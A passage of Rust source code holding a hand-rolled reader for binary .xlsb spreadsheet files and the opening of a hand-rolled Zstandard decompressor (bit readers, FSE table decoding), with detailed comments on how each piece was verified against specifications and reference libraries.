        Ok(out)
    }

    // --- Hand-rolled BIFF12 (.xlsb) reader ---
    // `.xlsb` shares its outer container with `.xlsx` - the exact same
    // OPC ZIP-of-parts layout (`xl/workbook.bin`, `xl/worksheets/*.bin`,
    // `xl/sharedStrings.bin`, `xl/styles.bin`, and - still plain XML even
    // here - `xl/_rels/*.rels`) - so this reuses `ZipArchive` and
    // `xml_parse` directly. What's different is every part's own
    // content: BIFF12 binary records instead of XML elements. BIFF12's
    // own record framing is considerably simpler than BIFF8's: a 1- or
    // 2-byte variable-length record *type* (high bit of the first byte
    // signals a second byte) followed by a 1-to-4-byte base-128 varint
    // *length* - no fixed 16-bit length cap, so (unlike BIFF8) there's no
    // CONTINUE-record concept to handle at all. Every field layout below
    // was read from calamine's own `xlsb/mod.rs`/`xlsb/cells_reader.rs`
    // source first, the same discipline as every other hand-rolled
    // reader in this project - RK's compact numeric encoding turned out
    // to be byte-for-byte identical to BIFF8's own, so `xls_rk_decode`
    // is reused directly rather than reimplemented.
    //
    // Verification here needed one more step than usual, because
    // calamine itself turned out not to be a fully reliable oracle for
    // this format - see `xlsb_parse_bundle_sh`'s own doc comment for a
    // real bug this uncovered (independently reproduced in a second,
    // unrelated implementation - Python's `pyxlsb` - not just calamine),
    // and CLAUDE.md's Dependency footprint section for the full writeup.

    struct XlsbSheetEntry {
        name: String,
        part_path: String,
    }

    struct Biff12RecordIter<'a> {
        data: &'a [u8],
        pos: usize,
    }

    impl<'a> Biff12RecordIter<'a> {
        fn new(data: &'a [u8]) -> Self {
            Biff12RecordIter { data, pos: 0 }
        }

        fn read_u8(&mut self) -> Result<u8> {
            let b = *self
                .data
                .get(self.pos)
                .context("unexpected end of BIFF12 record stream")?;
            self.pos += 1;
            Ok(b)
        }

        fn read_type(&mut self) -> Result<u16> {
            let b = self.read_u8()?;
            Ok(if b & 0x80 != 0 {
                let b2 = self.read_u8()?;
                (b & 0x7F) as u16 | (((b2 & 0x7F) as u16) << 7)
            } else {
                b as u16
            })
        }

        fn read_len(&mut self) -> Result<usize> {
            let mut b = self.read_u8()?;
            let mut len = (b & 0x7F) as usize;
            let mut shift = 7;
            for _ in 1..4 {
                if b & 0x80 == 0 {
                    break;
                }
                b = self.read_u8()?;
                len += ((b & 0x7F) as usize) << shift;
                shift += 7;
            }
            Ok(len)
        }
    }

    impl<'a> Iterator for Biff12RecordIter<'a> {
        type Item = Result<(u16, &'a [u8])>;

        fn next(&mut self) -> Option<Self::Item> {
            if self.pos >= self.data.len() {
                return None;
            }
            let typ = match self.read_type() {
                Ok(t) => t,
                Err(e) => return Some(Err(e)),
            };
            let len = match self.read_len() {
                Ok(l) => l,
                Err(e) => return Some(Err(e)),
            };
            let body = match self.data.get(self.pos..self.pos + len) {
                Some(b) => b,
                None => return Some(Err(anyhow!("truncated BIFF12 record body"))),
            };
            self.pos += len;
            Some(Ok((typ, body)))
        }
    }

    /// A BIFF12 `XLWideString`: a 4-byte character count followed by
    /// that many UTF-16LE code units - always UTF-16, never BIFF8's
    /// compressed/uncompressed split, and never spanning a CONTINUE
    /// record (BIFF12 has none), so this is considerably simpler than
    /// the `.xls` reader's own string decoding.
    fn xlsb_wide_str(data: &[u8]) -> Result<String> {
        let cch = xls_read_u32(data, 0)? as usize;
        let bytes = data
            .get(4..4 + cch * 2)
            .context("truncated BIFF12 wide string")?;
        let units: Vec<u16> = bytes
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        Ok(char::decode_utf16(units)
            .map(|r| r.unwrap_or('\u{FFFD}'))
            .collect())
    }

    fn xlsb_parse_relationships(rels_xml: &str) -> Result<HashMap<String, String>> {
        let root = xml_parse(rels_xml)?;
        let mut out = HashMap::new();
        for rel in root.children_named("Relationship") {
            if let (Some(id), Some(target)) = (rel.attr("Id"), rel.attr("Target")) {
                out.insert(id.to_string(), target.to_string());
            }
        }
        Ok(out)
    }

    /// `BrtBundleSh` [MS-XLSB 2.4.316]: a fixed `hsState`/`itabID` header,
    /// then a length-prefixed relationship-ID string (the length itself
    /// prefixed by a 4-byte `cch`, or the sentinel `0xFFFFFFFF` for "no
    /// relationship"), then a length-prefixed sheet name.
    ///
    /// Microsoft's own published spec example shows that fixed header as
    /// exactly 8 bytes (`hsState` then `itabID`, 4 bytes each), and most
    /// real files - confirmed directly against this project's own
    /// `sample.xlsb` fixture - do use exactly that. But a second, equally
    /// real fixture (Apache POI's own `Simple.xlsb`, from POI's own
    /// `test-data` corpus) has 4 extra reserved bytes there instead (12
    /// bytes total) - confirmed by hand, byte-for-byte, against that
    /// file's actual `xl/_rels/workbook.bin.rels` contents, not assumed.
    /// That discrepancy isn't hypothetical: it's *exactly* what makes
    /// both calamine and Python's independent `pyxlsb` library fail on
    /// this exact file - both hardcode the 8-byte offset, so both slice
    /// out a garbled 1-character "relationship ID" that can't be found
    /// in the real relationships map (calamine panics with "no entry
    /// found for key", pyxlsb raises `KeyError`) - a genuine bug shared
    /// by two independent, unrelated implementations, not a quirk of one
    /// library's own code.
    ///
    /// Rather than hardcode either offset, this tries the documented
    /// 8-byte header first and only falls back to 12 if that produces a
    /// relationship ID that isn't actually present in the relationships
    /// map already parsed from `xl/_rels/workbook.bin.rels` - a real
    /// structural corroboration check against already-known-good data,
    /// not a guess, the same "verify before trusting a fixed offset"
    /// discipline this project applies everywhere else (compare the
    /// preamble-detection and dBase/Stata version-sniffing heuristics).
    fn xlsb_parse_bundle_sh(
        body: &[u8],
        relationships: &HashMap<String, String>,
    ) -> Result<Option<XlsbSheetEntry>> {
        for header_len in [8usize, 12usize] {
            if body.len() < header_len + 4 {
                continue;
            }
            let rel_char_count = xls_read_u32(body, header_len)?;
            if rel_char_count == 0xFFFF_FFFF {
                return Ok(None); // no relationship for this bundle entry
            }
            let rel_bytes_end = header_len + 4 + rel_char_count as usize * 2;
            if rel_bytes_end > body.len() {
                continue;
            }
            let rel_id = xlsb_wide_str(&body[header_len..])?;
            if let Some(target) = relationships.get(&rel_id) {
                let name = xlsb_wide_str(&body[rel_bytes_end..])?;
                return Ok(Some(XlsbSheetEntry {
                    name,
                    part_path: format!("xl/{target}"),
                }));
            }
        }
        Ok(None)
    }

    /// Parses `xl/workbook.bin`'s `BrtBundleSh` records into an ordered
    /// sheet list. `BrtWbProp`'s 1904-date-system flag is deliberately
    /// not tracked here - the `.xlsx`/`.xls` readers don't handle that
    /// date system either (see CLAUDE.md's Known limitations), and this
    /// reader stays consistent with that existing, disclosed gap rather
    /// than fixing it for just one of the three formats.
    fn xlsb_parse_workbook(
        data: &[u8],
        relationships: &HashMap<String, String>,
    ) -> Result<Vec<XlsbSheetEntry>> {
        let mut sheets = Vec::new();
        for record in Biff12RecordIter::new(data) {
            let (typ, body) = record?;
            if typ == 0x009C {
                // BrtBundleSh
                if let Some(entry) = xlsb_parse_bundle_sh(body, relationships)? {
                    sheets.push(entry);
                }
            }
        }
        Ok(sheets)
    }

    /// `xl/styles.bin`: `BrtFmt` [MS-XLSB 2.4.148] custom format
    /// definitions (format id as `u16`, then the format code as a wide
    /// string), followed later by *two* separate XF tables that share
    /// the exact same per-entry record type (`BrtXF`, [MS-XLSB 2.4.826]):
    /// `cellStyleXfs` (named style definitions like "Normal"/"Percent",
    /// never referenced by a cell directly) and `cellXfs` (the real
    /// per-cell format table a cell's own style reference indexes into).
    /// A flat scan collecting every `BrtXF` record regardless of which
    /// section it's in was tried first and is wrong - confirmed by a
    /// real mismatch against calamine on `poi_various.xlsb` (a genuine
    /// date cell rendered as its raw, unresolved serial number instead
    /// of a date), traced to `cellStyleXfs`'s own entries shifting every
    /// later cell's style-ref index by however many style-only entries
    /// preceded the real `cellXfs` table. Fixed by mirroring calamine's
    /// own two-phase read exactly: only `BrtFmt` records immediately
    /// following `BrtBeginFmts` (up to its own declared count) populate
    /// the custom-format table, and only `BrtXF` records immediately
    /// following `BrtBeginCellXFs` (0x0269, likewise count-bounded) ever
    /// get pushed into the returned table - anything in between,
    /// including a `cellStyleXfs` section's own `BrtXF` entries, is
    /// walked past and ignored, the same way calamine's own top-level
    /// dispatch loop only reacts to those two specific begin-markers.
    fn xlsb_parse_styles(data: &[u8]) -> Result<Vec<bool>> {
        let mut custom_date_formats: HashMap<u16, bool> = HashMap::new();
        let mut is_date_by_xf: Vec<bool> = Vec::new();
        let mut iter = Biff12RecordIter::new(data);
        while let Some(record) = iter.next() {
            let (typ, body) = record?;
            match typ {
                0x0267 => {
                    // BrtBeginFmts - a u32 count, then exactly that many
                    // BrtFmt records follow (skipping anything else).
                    if body.len() < 4 {
                        continue;
                    }
                    let count = xls_read_u32(body, 0)?;
                    let mut seen = 0u32;
                    while seen < count {
                        let Some(next) = iter.next() else { break };
                        let (t, b) = next?;
                        if t == 0x002C && b.len() >= 2 {
                            let fmt_code = xls_read_u16(b, 0)?;
                            let fmt_str = xlsb_wide_str(&b[2..])?;
                            custom_date_formats
                                .insert(fmt_code, xlsx_is_date_format_code(&fmt_str));
                            seen += 1;
                        }
                    }
                }
                0x0269 => {
                    // BrtBeginCellXFs - the *real* cell format table,
                    // same count-then-entries shape as BrtBeginFmts.
                    if body.len() < 4 {
                        continue;
                    }
                    let count = xls_read_u32(body, 0)?;
                    let mut seen = 0u32;
                    while seen < count {
                        let Some(next) = iter.next() else { break };
                        let (t, b) = next?;
                        if t == 0x002F && b.len() >= 4 {
                            let fmt_code = xls_read_u16(b, 2)?;
                            let is_date = custom_date_formats
                                .get(&fmt_code)
                                .copied()
                                .unwrap_or_else(|| xls_builtin_format_is_date(fmt_code));
                            is_date_by_xf.push(is_date);
                            seen += 1;
                        }
                    }
                    break; // cellXfs is always the last table this reader needs
                }
                _ => {}
            }
        }
        Ok(is_date_by_xf)
    }

    /// `xl/sharedStrings.bin`: every `BrtSSTItem` [MS-XLSB 2.4.822] is a
    /// 1-byte (unused here) rich-text flag byte followed by a plain wide
    /// string - collected in file order, matching the index a
    /// `BrtCellIsst` cell record refers to.
    fn xlsb_parse_shared_strings(data: &[u8]) -> Result<Vec<String>> {
        let mut sst = Vec::new();
        for record in Biff12RecordIter::new(data) {
            let (typ, body) = record?;
            if typ == 0x0013 && !body.is_empty() {
                sst.push(xlsb_wide_str(&body[1..])?);
            }
        }
        Ok(sst)
    }

    /// A cell record's shared header [MS-XLSB 2.5.9]: `col` as a `u32`
    /// at offset 0, then a 24-bit style/XF reference at offset 4 (byte 7
    /// is unused padding) - the value-specific payload starts at offset
    /// 8 for every cell record type.
    fn xlsb_cell_style_ref(buf: &[u8]) -> usize {
        u32::from_le_bytes([buf[4], buf[5], buf[6], 0]) as usize
    }

    /// Parses one worksheet part (`xl/worksheets/sheetN.bin`) into the
    /// same dense `row x column` grid shape every other reader in this
    /// project produces. `BrtRowHdr` carries the current row for every
    /// cell record that follows until the next one (cell records
    /// themselves carry only a column); a formula cell's cached result
    /// (`BrtFmlaNum`/`BrtFmlaBool`/`BrtFmlaString`/`BrtFmlaError`) is
    /// read the exact same way as its non-formula counterpart - this
    /// reader deliberately never parses the formula token stream itself,
    /// matching the `.xls`/`.xlsx` readers' own "cached value only"
    /// scope. `BrtCellBlank` (an explicitly-blank cell) is silently
    /// skipped, the same "absent = missing" convention every other
    /// reader in this project already uses.
    fn xlsb_parse_sheet(
        data: &[u8],
        sst: &[String],
        is_date_by_xf: &[bool],
    ) -> Result<Vec<Vec<Option<String>>>> {
        let mut sparse: Vec<(u32, u32, String)> = Vec::new();
        let mut max_row: i64 = -1;
        let mut max_col: i64 = -1;
        let mut row: u32 = 0;

        macro_rules! record_cell {
            ($col:expr, $val:expr) => {{
                let col = $col;
                max_row = max_row.max(row as i64);
                max_col = max_col.max(col as i64);
                sparse.push((row, col, $val));
            }};
        }

        for record in Biff12RecordIter::new(data) {
            let (typ, body) = record?;
            match typ {
                0x0000 => {
                    // BrtRowHdr
                    if body.len() >= 4 {
                        row = xls_read_u32(body, 0)?;
                    }
                }
                0x0092 => break, // BrtEndSheetData
                0x0002 => {
                    // BrtCellRk
                    let d = body.get(0..12).context("truncated BrtCellRk record")?;
                    let col = xls_read_u32(d, 0)?;
                    let style_ref = xlsb_cell_style_ref(d);
                    let val: [u8; 4] = d[8..12].try_into().unwrap();
                    let v = xls_rk_decode(val)?;
                    let is_date = is_date_by_xf.get(style_ref).copied().unwrap_or(false);
                    record_cell!(col, xls_numeric_cell_text(v, is_date));
                }
                0x0003 | 0x000B => {
                    // BrtCellError | BrtFmlaError
                    let d = body
                        .get(0..9)
                        .context("truncated BIFF12 error cell record")?;
                    let col = xls_read_u32(d, 0)?;
                    record_cell!(col, xls_error_code_to_string(d[8])?);
                }
                0x0004 | 0x000A => {
                    // BrtCellBool | BrtFmlaBool
                    let d = body
                        .get(0..9)
                        .context("truncated BIFF12 bool cell record")?;
                    let col = xls_read_u32(d, 0)?;
                    record_cell!(col, (d[8] != 0).to_string());
                }
                0x0005 | 0x0009 => {
                    // BrtCellReal | BrtFmlaNum
                    let d = body
                        .get(0..16)
                        .context("truncated BIFF12 numeric cell record")?;
                    let col = xls_read_u32(d, 0)?;
                    let style_ref = xlsb_cell_style_ref(d);
                    let v = xls_read_f64(d, 8)?;
                    let is_date = is_date_by_xf.get(style_ref).copied().unwrap_or(false);
                    record_cell!(col, xls_numeric_cell_text(v, is_date));
                }
                0x0006 | 0x0008 => {
                    // BrtCellSt | BrtFmlaString
                    let col = xls_read_u32(body, 0)?;
                    let s = xlsb_wide_str(
                        body.get(8..)
                            .context("truncated BIFF12 string cell record")?,
                    )?;
                    record_cell!(col, s);
                }
                0x0007 => {
                    // BrtCellIsst
                    let d = body.get(0..12).context("truncated BrtCellIsst record")?;
                    let col = xls_read_u32(d, 0)?;
                    let idx = xls_read_u32(d, 8)? as usize;
                    if let Some(s) = sst.get(idx) {
                        record_cell!(col, s.clone());
                    }
                }
                _ => {}
            }
        }

        if max_row < 0 || max_col < 0 {
            return Ok(Vec::new());
        }
        let mut grid: Vec<Vec<Option<String>>> =
            vec![vec![None; (max_col + 1) as usize]; (max_row + 1) as usize];
        for (r, c, v) in sparse {
            grid[r as usize][c as usize] = Some(v);
        }
        Ok(grid)
    }

    pub(crate) fn columns_from_xlsb(
        path: &Path,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
        let zip = ZipArchive::open(path)?;

        let rels_xml = String::from_utf8(zip.read("xl/_rels/workbook.bin.rels")?)
            .context("xl/_rels/workbook.bin.rels is not valid UTF-8")?;
        let relationships = xlsb_parse_relationships(&rels_xml)?;

        let workbook_bin = zip.read("xl/workbook.bin")?;
        let sheet_entries = xlsb_parse_workbook(&workbook_bin, &relationships)?;
        if sheet_entries.is_empty() {
            bail!("no sheets found in {path:?}");
        }

        let sst = match zip.read("xl/sharedStrings.bin") {
            Ok(bytes) => xlsb_parse_shared_strings(&bytes)?,
            Err(_) => Vec::new(),
        };
        let is_date_by_xf = match zip.read("xl/styles.bin") {
            Ok(bytes) => xlsb_parse_styles(&bytes)?,
            Err(_) => Vec::new(),
        };

        let mut out = Vec::new();
        for entry in sheet_entries {
            let sheet_bytes = zip
                .read(&entry.part_path)
                .with_context(|| format!("failed to read sheet '{}' in {path:?}", entry.name))?;
            let grid = xlsb_parse_sheet(&sheet_bytes, &sst, &is_date_by_xf)?;

            let mut rows = grid.into_iter();
            let Some(header_row) = rows.next() else {
                continue; // empty sheet (or a non-tabular one, e.g. a chart) - contributes no table
            };
            let headers: Vec<String> = header_row
                .iter()
                .map(|c| c.clone().unwrap_or_default())
                .collect();

            let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); headers.len()];
            for (i, row) in rows.enumerate() {
                if nrows.is_some_and(|limit| i >= limit) {
                    break;
                }
                for (col_idx, col) in raw.iter_mut().enumerate() {
                    col.push(row.get(col_idx).cloned().flatten());
                }
            }

            let mut profiles = Vec::new();
            for (i, name) in headers.into_iter().enumerate() {
                let total = raw[i].len();
                let non_null: Vec<String> = raw[i].iter().filter_map(|v| v.clone()).collect();
                let current_type = if non_null.is_empty() {
                    "String".to_string()
                } else {
                    let refs: Vec<&str> = non_null.iter().map(|s| s.as_str()).collect();
                    naive_current_type(&refs).to_string()
                };
                let col = ColumnInput {
                    name,
                    current_type,
                    raw_values: non_null,
                    total,
                    skip_heuristics: false,
                };
                profiles.push(profile_column(col, n_samples));
            }
            out.push((entry.name, profiles));
        }

        if out.is_empty() {
            bail!("no non-empty sheets found in {path:?}");
        }
        Ok(out)
    }
} // mod xlsx_support

/// Hand-rolled Zstandard (RFC 8878) decoder, replacing the `zstd` crate at
/// runtime (see CLAUDE.md's Dependency footprint section). Every algorithm
/// here was verified directly against RFC 8878's own text and, for the
/// trickiest pieces (bitstream direction, FSE table construction, the
/// repeat-offset state machine), against the vendored C reference source
/// inside the `zstd-sys` crate - the same "verify against source, not
/// memory" discipline every other hand-roll in this project follows.
/// Dictionaries are out of scope (this project's `.zst` use case never
/// needs them, the same "no dictionary support" boundary noted elsewhere).
///
/// Gated on `any(zstd, avro)`, not just `zstd`: the `avro` feature's own
/// hand-rolled reader (`avro_support`) reuses `zstd_decompress` directly
/// for Avro's Zstandard codec, the same way it reuses `inflate` for
/// Avro's Deflate codec - one decoder serving two independent features,
/// exactly like `zip_support` already serves both `xlsx` and `npy`.
#[cfg(any(feature = "zstd", feature = "avro"))]
mod zstd_support {
    use super::*;

    // ---------------------------------------------------------------
    // Bit readers
    // ---------------------------------------------------------------

    /// Reads bits from the END of a buffer toward the start - the
    /// convention FSE- and Huffman-coded streams both use (RFC 8878
    /// 4.1/4.2), verified against zstd's own `bitstream.h`
    /// (`BIT_initDStream`/`BIT_readBits`). The stream's logical end is a
    /// sentinel: the highest set bit of the very last byte (anything after
    /// it, up to the byte boundary, is padding with no meaning) - so
    /// decoding starts by locating that bit, then walks backward, treating
    /// the whole buffer as one continuous bit sequence addressed by a
    /// single global (byte*8 + bit) index, LSB-first within each byte.
    struct BackwardBitReader<'a> {
        data: &'a [u8],
        // Bits [0, top) are still unread; reading n bits consumes the
        // TOP n of them, i.e. global indices [top-n, top).
        top: u32,
    }

    impl<'a> BackwardBitReader<'a> {
        fn new(data: &'a [u8]) -> Result<Self> {
            let last = *data.last().context("empty FSE/Huffman-coded bitstream")?;
            if last == 0 {
                bail!(
                    "malformed zstd bitstream: missing end-mark (last byte of an FSE/Huffman stream is zero)"
                );
            }
            let highbit = 7 - last.leading_zeros();
            let top = 8 * (data.len() as u32 - 1) + highbit;
            Ok(BackwardBitReader { data, top })
        }

        fn bit_at(&self, g: u32) -> u32 {
            let byte = self.data[(g / 8) as usize];
            ((byte >> (g % 8)) & 1) as u32
        }

        /// Reads exactly `n` bits (n <= 32); errors if that many aren't
        /// available. The earliest-read (lowest global index) bit becomes
        /// the LSB of the result, matching the format's little-endian
        /// convention.
        fn read(&mut self, n: u32) -> Result<u32> {
            if n == 0 {
                return Ok(0);
            }
            if n > self.top {
                bail!("malformed zstd bitstream: ran out of bits mid-symbol");
            }
            let start = self.top - n;
            let mut v: u32 = 0;
            for i in 0..n {
                v |= self.bit_at(start + i) << i;
            }
            self.top = start;
            Ok(v)
        }

        /// Reads up to `n` bits, zero-padding on the *low* side for any
        /// shortfall rather than erroring - the documented behavior once a
        /// bitstream's real content is exhausted (RFC 8878 4.2.1.2: "it is
        /// assumed that extra bits are zero"). Returns (value, exhausted)
        /// where `exhausted` is true iff fewer than `n` real bits were
        /// available, i.e. this read used at least one phantom bit.
        fn read_padded(&mut self, n: u32) -> (u32, bool) {
            let avail = self.top.min(n);
            let real = self.read(avail).unwrap_or(0);
            ((real << (n - avail)), avail < n)
        }

        /// Non-consuming look at the top `n` bits (zero-padded on the low
        /// side if fewer remain) - used by the Huffman flat-table decoder,
        /// which must see `max_bits` before knowing how many to actually
        /// consume.
        fn peek_padded(&self, n: u32) -> u32 {
            let avail = self.top.min(n);
            let start = self.top - avail;
            let mut v: u32 = 0;
            for i in 0..avail {
                v |= self.bit_at(start + i) << i;
            }
            v << (n - avail)
        }

        fn consume(&mut self, n: u32) {
            self.top = self.top.saturating_sub(n);
        }
    }

    /// Forward, LSB-first bit reader - the ordinary convention, used only
    /// for an FSE table description (RFC 8878 4.1.1), which (unlike the
    /// FSE-/Huffman-coded data that follows it) is read forward.
    struct ForwardBitReader<'a> {
        data: &'a [u8],
        pos: usize,
    }

    impl<'a> ForwardBitReader<'a> {
        fn new(data: &'a [u8]) -> Self {
            ForwardBitReader { data, pos: 0 }
        }

        fn read(&mut self, n: u32) -> Result<u32> {
            let mut v: u32 = 0;
            for i in 0..n {
                let g = self.pos + i as usize;
                let byte = *self
                    .data
                    .get(g / 8)
                    .context("FSE table description ran out of bytes")?;
                v |= (((byte >> (g % 8)) & 1) as u32) << i;
            }
            self.pos += n as usize;
            Ok(v)
        }

        /// Bytes consumed so far, rounded up - the literals/sequences
        /// section headers need this to know where the table description
        /// ends and the next field begins.
        fn bytes_consumed(&self) -> usize {
            self.pos.div_ceil(8)
        }
    }

    // ---------------------------------------------------------------
    // FSE (Finite State Entropy)
    // ---------------------------------------------------------------

    const FSE_MIN_TABLELOG: u32 = 5;

    #[derive(Clone, Copy, Default)]
    struct FseEntry {
        symbol: u8,
        nb_bits: u8,
        baseline: u16,
    }

    struct FseTable {
        table_log: u32,
        entries: Vec<FseEntry>,
    }

    impl FseTable {
        fn init_state(&self, reader: &mut BackwardBitReader) -> Result<usize> {
            Ok(reader.read(self.table_log)? as usize)
        }
    }

    /// RFC 8878 4.1.1's FSE table description: reads normalized
    /// probability counts plus the accuracy log, from a forward-read
    /// bitstream. Probabilities of exactly 0 are followed by a 2-bit
    /// repeat flag chain encoding a run of further zero-probability
    /// symbols. `max_symbol` is only a safety upper bound (a corruption
    /// guard / buffer capacity, matching `FSE_readNCount_body`'s in/out
    /// `maxSVPtr` in zstd's vendored `entropy_common.c`) - per RFC 8878
    /// 4.1.1, "An FSE distribution table describes the probabilities of
    /// all symbols from 0 to the last present one (included)", so the
    /// real alphabet size is however many symbols the table actually
    /// describes (until `remaining` reaches 1), which can be far smaller
    /// than `max_symbol` - the returned `Vec` is truncated to that real
    /// size, not padded out to `max_symbol`. Verified digit-for-digit
    /// against RFC 8878's own worked example (Accuracy_Log=8, 100 points
    /// already distributed -> max=98, matching this function's `max`
    /// computation exactly).
    fn fse_read_ncount(reader: &mut ForwardBitReader, max_symbol: u32) -> Result<(u32, Vec<i32>)> {
        let accuracy_log = reader.read(4)? + FSE_MIN_TABLELOG;
        if accuracy_log > 15 {
            bail!("malformed zstd FSE table: accuracy log {accuracy_log} out of range");
        }
        let mut counts = vec![0i32; (max_symbol + 1) as usize];
        let mut remaining: i64 = (1i64 << accuracy_log) + 1;
        let mut nbbits: u32 = accuracy_log + 1;
        let mut charnum: u32 = 0;
        let mut prev_zero = false;

        while remaining > 1 && charnum <= max_symbol {
            if prev_zero {
                let mut n0 = charnum;
                loop {
                    let chunk = reader.read(2)?;
                    if chunk == 3 {
                        n0 += 3;
                    } else {
                        n0 += chunk;
                        break;
                    }
                }
                if n0 > max_symbol + 1 {
                    bail!("malformed zstd FSE table: zero-run overruns the symbol table");
                }
                while charnum < n0 {
                    counts[charnum as usize] = 0;
                    charnum += 1;
                }
                if charnum > max_symbol {
                    break;
                }
            }

            let half_threshold = 1i64 << (nbbits - 1);
            let max = (2 * half_threshold - 1) - remaining;
            let low = reader.read(nbbits - 1)? as i64;
            let count = if low < max {
                low
            } else {
                let hi = reader.read(1)? as i64;
                let full = low + (hi << (nbbits - 1));
                if full >= half_threshold {
                    full - max
                } else {
                    full
                }
            };
            let count = count - 1; // "extra accuracy": 0 decodes to probability -1
            if charnum as usize >= counts.len() {
                bail!("malformed zstd FSE table: more symbols than expected");
            }
            counts[charnum as usize] = count as i32;
            charnum += 1;
            remaining -= if count < 0 { 1 } else { count };
            prev_zero = count == 0;

            if remaining > 1 {
                // nbbits = bit_length(remaining): the largest power of 2
                // that is <= remaining is 2^(nbbits-1). Using
                // `remaining - 1` here (an earlier, incorrect draft) is
                // off by one exactly when `remaining` is itself a power
                // of 2, since bit_length(remaining) and
                // bit_length(remaining-1) only coincide when it isn't.
                nbbits = 32 - (remaining as u32).leading_zeros();
            }
        }

        if remaining != 1 {
            bail!("malformed zstd FSE table: probabilities don't sum to the declared accuracy");
        }
        counts.truncate(charnum as usize);
        Ok((accuracy_log, counts))
    }

    /// Builds an FSE decode table from normalized probability counts (RFC
    /// 8878 4.1.1's "Symbols are scanned... All remaining symbols are
    /// allocated..." procedure). `-1`-probability symbols get a single
    /// cell at the end of the table (a full state reset); every other
    /// symbol gets `count` cells spread through the table via the fixed
    /// step `(tableSize>>1)+(tableSize>>3)+3`. The per-state
    /// Number_of_Bits/Baseline assignment scans table positions in order
    /// and, for each symbol, uses a simple running counter (starting at
    /// that symbol's own probability count) rather than RFC 8878's more
    /// manual "sort states, assign widths" description - proven equivalent
    /// by hand against the RFC's own worked example (Table 21: a
    /// probability-5 symbol at tableLog=7 gives states 5,6,7,8,9 ->
    /// nbBits 5,5,5,4,4, baselines 32,64,96,0,16, matching exactly) and
    /// against `FSE_buildDTable_internal` in zstd's vendored
    /// `fse_decompress.c`.
    fn fse_build_table(table_log: u32, counts: &[i32]) -> Result<FseTable> {
        let table_size = 1usize << table_log;
        let mut symbol_of = vec![0u8; table_size];
        let mut assigned = vec![false; table_size];

        let mut high_threshold = table_size - 1;
        for (symbol, &count) in counts.iter().enumerate() {
            if count == -1 {
                symbol_of[high_threshold] = symbol as u8;
                assigned[high_threshold] = true;
                high_threshold -= 1;
            }
        }

        let step = (table_size >> 1) + (table_size >> 3) + 3;
        let mask = table_size - 1;
        let mut position = 0usize;
        for (symbol, &count) in counts.iter().enumerate() {
            if count <= 0 {
                continue;
            }
            for _ in 0..count {
                symbol_of[position] = symbol as u8;
                assigned[position] = true;
                position = (position + step) & mask;
                while position > high_threshold {
                    position = (position + step) & mask;
                }
            }
        }
        if position != 0 {
            bail!("malformed zstd FSE table: symbol spread did not return to position 0");
        }
        if assigned.iter().any(|&a| !a) {
            bail!("malformed zstd FSE table: not every state was assigned a symbol");
        }

        let mut symbol_next: Vec<u32> = counts
            .iter()
            .map(|&c| if c == -1 { 1 } else { c.max(0) as u32 })
            .collect();
        let mut entries = vec![FseEntry::default(); table_size];
        for (state, &symbol) in symbol_of.iter().enumerate() {
            let next_state = symbol_next[symbol as usize];
            symbol_next[symbol as usize] += 1;
            let nb_bits = table_log - (31 - next_state.leading_zeros());
            let baseline = ((next_state << nb_bits) as i64 - table_size as i64) as u16;
            entries[state] = FseEntry {
                symbol,
                nb_bits: nb_bits as u8,
                baseline,
            };
        }

        Ok(FseTable { table_log, entries })
    }

    fn fse_table_from_description(
        reader: &mut ForwardBitReader,
        max_symbol: u32,
    ) -> Result<FseTable> {
        let (table_log, counts) = fse_read_ncount(reader, max_symbol)?;
        fse_build_table(table_log, &counts)
    }

    /// Decodes a generic FSE-compressed byte stream using two interleaved
    /// states sharing one table - RFC 8878 4.2.1.2's scheme for
    /// FSE-compressed Huffman weights, which is really just zstd's
    /// standard single-table FSE stream format (`FSE_decompress`).
    /// Termination is driven by the bitstream running out (RFC: "if
    /// updating state after decoding a symbol would require more bits
    /// than remain in the stream, it is assumed that extra bits are
    /// zero"), not a known symbol count - verified against
    /// `FSE_decompress_usingDTable_generic` in zstd's vendored
    /// `fse_decompress.c`: each turn emits the *current* state's symbol
    /// (set by an earlier update or by init), then updates that state;
    /// the moment an update needed padding, one more symbol is emitted
    /// from the other state and decoding stops.
    fn fse_decode_interleaved(
        reader: &mut BackwardBitReader,
        table: &FseTable,
        max_symbols: usize,
    ) -> Result<Vec<u8>> {
        let mut state = [table.init_state(reader)?, table.init_state(reader)?];
        let mut out = Vec::new();
        let mut turn = 0usize;
        loop {
            let entry = table.entries[state[turn]];
            out.push(entry.symbol);
            if out.len() >= max_symbols {
                break;
            }
            let n = entry.nb_bits as u32;
            let avail_before = reader.top;
            let (value, _) = reader.read_padded(n);
            state[turn] = entry.baseline as usize + value as usize;
            let exhausted = n > avail_before;
            turn ^= 1;
            if exhausted {
                let entry2 = table.entries[state[turn]];
                out.push(entry2.symbol);
                break;
            }
        }
        Ok(out)
    }

    // ---------------------------------------------------------------
    // Predefined FSE distributions (RFC 8878 3.1.1.3.2.2), and their
    // fully-built decode tables (RFC 8878 Appendix A) - hardcoded
    // directly from the RFC's own worked-out tables rather than run
    // through `fse_build_table` at every use, since Appendix A states
    // outright "these tables ... can be used ... to crosscheck that an
    // implementation has built its decoding tables correctly." A unit
    // test builds each from its raw distribution via `fse_build_table`
    // and asserts the result matches these constants exactly, so
    // `fse_build_table` itself (needed anyway for FSE_Compressed mode)
    // gets proven correct against the same source.
    // ---------------------------------------------------------------

    const LL_DEFAULT_DISTRIBUTION: [i32; 36] = [
        4, 3, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2, 3, 2, 1, 1, 1,
        1, 1, -1, -1, -1, -1,
    ];
    const ML_DEFAULT_DISTRIBUTION: [i32; 53] = [
        1, 4, 3, 2, 2, 2, 2, 2, 2, 1, 1, 1, 1, 1, 1, 1, //
        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, //
        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, -1, -1, //
        -1, -1, -1, -1, -1,
    ];
    const OF_DEFAULT_DISTRIBUTION: [i32; 29] = [
        1, 1, 1, 1, 1, 1, 2, 2, 2, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, -1, -1, -1, -1, -1,
    ];

